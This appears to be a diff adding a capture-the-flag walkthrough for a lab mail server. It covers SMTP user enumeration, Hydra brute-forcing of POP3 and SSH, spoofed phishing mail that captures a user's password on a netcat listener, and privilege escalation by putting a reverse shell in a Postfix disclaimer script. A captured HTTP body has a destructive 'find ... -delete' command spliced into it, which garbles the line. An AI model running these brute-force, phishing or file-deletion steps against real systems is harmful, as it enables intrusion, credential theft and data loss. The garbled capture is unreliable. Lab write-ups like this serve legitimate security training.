@@ -1,0 +1,95 @@
+Similar to sneakymailer :)
+
+Foothold:
+
+use usernamer to generate possible usernames
+
+/usr/share/legion/scripts/smtp-user-enum.pl to verify that usernames exists
+
+/usr/share/seclists/Usernames/Names/names.txt with smtp-user-enum to find out that hr and sales exists and probably it and legal as well
+
+1. Can immediately try a client side attack by whacking all of the emails using the script provided by sneakymailer htb but alternatively...
+
+2. use hydra bruteforce pop3 with secured usernames + departments to get sales:sales (try not to do this as you may get banned)
+
+└─$ nc 192.168.222.137 110    
++OK Dovecot (Ubuntu) ready.
+USER sales
++OK
+PASS sales
++OK Logged in.
+LIST
++OK 1 messages:
+1 683
+.
+RETR 1
++OK 683 octets
+Return-Path: <it@postfish.off>
+X-Original-To: sales@postfish.off
+Delivered-To: sales@postfish.off
+Received: by postfish.off (Postfix, from userid 997)
+	id B277B45445; Wed, 31 Mar 2021 13:14:34 +0000 (UTC)
+Received: from x (localhost [127.0.0.1])
+	by postfish.off (Postfix) with SMTP id 7712145434
+	for <sales@postfish.off>; Wed, 31 Mar 2021 13:11:23 +0000 (UTC)
+Subject: ERP Registration Reminder
+Message-Id: <20210331131139.7712145434@postfish.off>
+Date: Wed, 31 Mar 2021 13:11:23 +0000 (UTC)
+From: it@postfish.off
+
+Hi Sales team,
+
+We will be sending out password reset links in the upcoming week so that we can get you registered on the ERP system.
+
+Regards,
+IT
+
+https://www.suburbancomputer.com/tips_email.htm
+
+List sales email to find out that it wants to send password reset email to sales
+
+craft mail with link to get brian.moore password
+
+must be from it@postfish.off
+
+└─$ sudo nc -lvnp 80                 
+[sudo] password for george93: 
+listening on [any] 80 ...
+connect to [192.168.49.222] from (UNKNOWN) [192.168.222.137] 40726
+POST / HTTP/1.1
+Host: 192.168.49.222
+User-Agent: curl/7.68.0
+Accept: */*
+Content-Length: 207
+Content-Type: application/x-www-form-urlencoded
+
+first_name%3DBrian%26last_name%3DMoore%26email%3Dbrian.moore%postfish.off%26username%3Dbrian.moore%26password%3DEternaLSunshinE%26confifind /var/mail/ -type f ! -name sales -delete_password%3DEternaLSunshinE
+
+ssh with brian.moore and the password (try multiple mutations, can even try the username generator
+
+hydra -L possible_brian_ssh.txt -p EternaLSunshinE 192.168.222.137 -t 4 ssh
+
+└─$ hydra -L possible_brian_ssh.txt -p EternaLSunshinE 192.168.222.137 -t 4 ssh
+Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-23 01:10:33
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 93 login tries (l:93/p:1), ~24 tries per task
+[DATA] attacking ssh://192.168.222.137:22/
+
+[STATUS] 55.00 tries/min, 55 tries in 00:01h, 38 to do in 00:01h, 4 active
+[22][ssh] host: 192.168.222.137   login: brian.moore   password: EternaLSunshinE
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-04-23 01:12:27
+
+
+
+
+Priv Esc:
+
+linpeas will show unusual file that you can edit
+
+https://www.howtoforge.com/how-to-automatically-add-a-disclaimer-to-outgoing-emails-with-altermime-postfix-on-debian-squeeze
+
+realise that disclaimers are scripts that auto run when an email is sent to a particular user. edit the disclaimer script with a reverse shell and re-run the client side attack
+
+sudo -l -> gtfo bins
